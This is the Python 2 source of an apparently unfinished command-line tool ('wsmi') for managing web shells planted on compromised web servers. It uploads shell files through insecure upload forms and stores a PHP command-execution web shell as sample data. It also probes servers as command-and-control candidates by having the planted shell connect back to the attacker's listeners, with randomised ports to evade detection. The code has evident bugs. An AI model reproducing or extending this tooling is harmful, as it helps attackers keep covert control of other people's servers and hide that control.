import sqlite3
import signal
import sys
import urllib2
import threading
import socket
import shells
import encoders
import random
import time
from classes import connection,connectionManager


#variables related to threading
database_lock = threading.Lock()#serialize access to the database

#condition to tell the socket listener to prematurely exit or not
#automatically will create a lock due to conditions 
listener_abort_event = threading.Event()
listener_success_event = threading.Event()

#global variables
database_name = ""
prompt = "wsmi>"
directory = ""
current_shell_id = 0
connection_manager = None
connect = None #might have to change this to being per listener
#need to get rid of this so that we can have more than one thread derp


###next section is for threading combined with sockets
class threading_network_listener(threading.Thread):
	"""
		This class represents the ability for the program to thread off and
		set up a listener and makes an http request to trigger the candidate web shell
		sitting on the compromised web server.
	"""

	def __init__(self, port = None):
		threading.Thread.__init__(self)
		self.connect = connection.connection(1)#need a way to pair connections with shells
		self.port = port#the intended port for the thread to listen on
		self.listen_sock = None#the actual socket listening on the port
		self.message = None
		self.connection = connect#TODO handle mapping of connections with threads
		self.port = port
		#print "self.port in the threading_network_listener init: ",self.port
		self.socket = self.create_socket(port)

	def create_socket(self,port):
		""" Creates a socket for the thread to listen on """
		listen_socket = None
		print port
		print type(port)
		try:
			listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
			listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			listen_socket.bind(("0.0.0.0", int(port)))#listens on any interface's ip address
			listen_socket.listen(5)#actually listen to a port
			#print "network listener socket bound to port ",self.port," ",port
		except socket.error:#need to handle the fact that both threads are using the same socket
			pass
		return listen_socket
	
	def run(self):
		"""
			Responsible for the running of the thread.
			Creates a socket and receives data from the network.
			If there is a transmission on this socket then this thread will add
			the entry to the database
		"""
		global listener_abort_event
		

		#we only need to accept once in this scenario.

		socks, address = self.socket.accept()

		data = socks.recv(1024)

		time.sleep(.4)#waiting for .4 seconds for the network to respond
		print 'woke up from my nap'
		if listener_abort_event.isSet():#need to abort
			pass
		#if(data == "ok"):#the network message that will be sent to let us know the firewall is open
		else:#should be the case that the firewall is open
			global database_name
			global current_shell_id
			print str(data)

			#synchronize access to the database
			database_lock.acquire()
			conn = sqlite3.connect(database_name)	
			cursor = conn.cursor()
			cursor.execute("insert into open_ports(id,port_no) values (?,?)",[(current_shell_id),(self.port)])
			conn.commit()
			database_lock.release()

		#cleanup
		sock.close()
		self.socket.close()
		print "closing socket"
		##TODO: move over to a curses interface 

class threading_http_request(threading.Thread):
	"""
		Class that spawns off a thread to perform an http request.
		Will notify the threading_network_listener thread in the event
		of an error that the remote server can't connect back.
	"""
	def __init__(self,url=None,port=None,self_ip=None,message="ok"):
		threading.Thread.__init__(self)
		self.url = url#the url that this thread will connect to.
		self.port = port#the port that the web request will connect to
		self.ip = self_ip#the attacker's machine
		self.message = message#the message to send to the listening socket

	def run(self):
		"""
			Handles making a request to the instance of this class's url.
		"""
		try:
			query_string = "http://" +self.url + "?p=" + str(self.port) +"&i=" + self.ip + "&m=" + self.message
			response = urllib2.urlopen(query_string)
			if response == "error":#port is blocked
				#global listener_abort_event.set()
				global listener_abort_event
				listener_abort_event.set()
		except ValueError:#something is wrong with the url
			print "something went wrong"


def print_banner():
	print "        _       __          __      _    __     __  __"
	print "       / \\      \\ \\        / /     |  | |     ||  "
	print "      /   \\      \\ \\      / /      |"
	print "     /_____\\      \\ \\    / /       |"

def upload_shell():
	"""
		Handles the interaction to the user to handle all the details
		of file uploading to the server.
	"""
	url = raw_input("url:")
	page = raw_input("page:")
	method = raw_input("http method:")
	file_name = raw_input("filename:")

def help():
	print "Interactive help menu type  help <module> to get more information on a module\n"
	print "upload-shell\t\t Upload a shell to target webserver"
	print "new-database\t\t Start a new database to keep track of webshells"
	print "view-shells\t\t View information about the currently running shells"

def router(command):
	"""
		Handles routing of functions that a simple dictionary will not accomplish
		Takes the last part of the command that the user entered and interprets it.
	"""
	global prompt
	global directory
	if command[0:6] == "shells":
		if len(command) == 6:
			prompt = "wsmi (shells)>"
			directory = "shells"
		elif command[6:] == "/php":
			prompt = "wsmi (shells/php)>"
			directory = "shells/php"

def get_input():
	""" gets the user's input and routes it accordingly"""
	global prompt
	userinput = raw_input(prompt)
	if userinput[:3] == "use":
		router(userinput[4:])
	else:
		try:
			functions[userinput]()
		except KeyError:
			print "caught error"

def initialize_database():
	"""
		Responsible for initializing a new database for storing user
		interactions with their webshells.Will prompt the user for a 
		database name and a new sqlite3	database will be created. The 
		only thing that will be committed is the changes to the schema
	"""
	
	name = raw_input("database name:")#prompting the user for a database name
	conn = sqlite3.connect(name)#creating the database
	global database_name
	database_name = name
	cursor = conn.cursor()

	#sample data for the time being
	try:
		cursor.execute("create table vulnerable_sites(url text,id integer, page text, method text, uploaded_shell text, attackurl text, language text)")
		cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
			[("192.168.56.101"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
		cursor.execute("create table open_ports(id integer, port_no integer, time text)")
		conn.commit()

	except sqlite3.OperationalError as e:
		print str(e)

def show_shells():
	"""
		Shows the currently uploaded shells at specified urls
	"""
	try:
		conn = sqlite3.connect(database_name)
		cursor = conn.cursor()
		query = "select attackurl from vulnerable_sites"
		cursor.execute(query)
		rows = cursor.fetchall()
		print "number\t\tattackurl"
		print "------\t\t---------"
		i=0
		for row in rows:
			print str(i)+'\t\t',row[0]
			i+=1
	except sqlite3.OperationalError:
		print "Need to have a database before you can view shells"

def exit():
	sys.exit(1)

"""
def manage_random_list():
	""
		Will manage a list of port numbers for scanning candidate shells
		randomly and not having a repeat in port numbers.  Yields the port number to 
		scan on.  Having an element of randomness will help not to be easily discovered.
		will generate port numbers from 1025-65535(non privileged ports)
	""
	global port_list
	random.seed()
	random_index = random.randrange(0,len(port_list))
	port_number = port_list.pop(random_index)
	yield port_number
"""

def run_candidate_threads(thread_count, timing, shell_id):
	"""
		Runs and manages threads for checking whether or not a server would be a good
		command and control candidate.
	""" 
	global connection_manager
	listener_array = []#holds all of the current threads
	temp_gen = 0

	for i in range(thread_count):#create all the new network listeners
		temp_gen = connect.new_get_port_number()
		temp_listener = threading_network_listener(temp_gen)
		listener_array.append(threading_network_listener(temp_gen))

	for thread in listener_array:#herp derp want the object not a pointer to it.
		thread.start()
	
	http_thread = threading_http_request("192.168.56.101/shell.php",temp_gen,"192.168.56.102","ok")#url,port,self_ip
	http_thread.start()

def check_candidacy():
	"""
		script that starts the process of checking a candidacy for a specific 
		web server.
	"""
	num_threads = int(raw_input("number of threads:"))
	#timing = int(raw_input("timing level(0-5):"))
	run_candidate_threads(num_threads,0,1)

def show_contents():
	global directory
	
	print "showing contents"

def open_database():
	"""
		Opens an already existing database and prints out the webshells running 
		as a part of the database
	"""
	try:
		db_name = raw_input("Existing database name:")
		conn = sqlite3.connect(db_name)
		global database_name
		database_name = db_name

		cursor = conn.cursor()
		cursor.execute("select id, attackurl from vulnerable_sites")
		print "number\t\tattackurl"
		print "------\t\t---------"
		rows = cursor.fetchall()
		for row in rows:
			print row[0],"\t\t",row[1]
	except sqlite3.OperationalError as e:
		print e.message
		#Todo: add prettier error messages

#a dictionary of functions that we can call based off of a user's input
functions = {
	"help":help,
	"upload-shell":upload_shell,
	"new-database":initialize_database,
	"open-database":open_database,
	"view-shells":show_shells,
	"exit":exit,
	"quit":exit,
	#"back":traverse_up,
	"show":show_contents,
	"check-candidacy":check_candidacy
}

def keyboardHandler(signal, frame):
		"""Handles keyboard interrupts and exits gracefully"""
		print ""
		sys.exit(0)
		#TODO: eventually write out to the database

def initialize():
	"""Handles the initialization for the entire program"""
	global connection_manager
	connection_manager = connectionManager()
	#global connect
	#TODO I know this is going to come in handy but for the
	#moment with only one connection object that is ever going to be 
	#created then this will be used again.

def main():
	#initialization function
	initialize()

	#handles keyboard interrupts gracefully
	signal.signal(signal.SIGINT, keyboardHandler)

	while 1:
		get_input()

def http_file_upload(url,filename):	
	"""
		Responsible for the actual uploading of a file.  Will handle the entirety of 
		uploading the file via http methods. 

		@param url the url of the malicious file upload
		@param filename the name of the file to upload at the moment must be inside the current directory
	"""
	file = open(filename,'r')
	file_contents = file.read()
	file.close()
	boundary = '-----------------WhenIwalkIntheClub'
	headers = {'User-Agent':'Mozilla 5.0',
				'Content-Type':'multipart/form-data; boundary='+boundary,}
	data = boundary + '\r\n' + "Content-Disposition: form-data; name=\"MAX FILE SIZE\"\r\n\r\n100000\r\n"
	data += boundary + '\r\nContent-Disposition: form-data; name="uploadedfile";name="' + filename + "\"\r\n"
	data += "Content-Type: application/x-object\r\n\r\n"+file_contents+'\r\n'+boundary+'--\r\n'
	request = urllib2.Request(url,data,headers)

main()
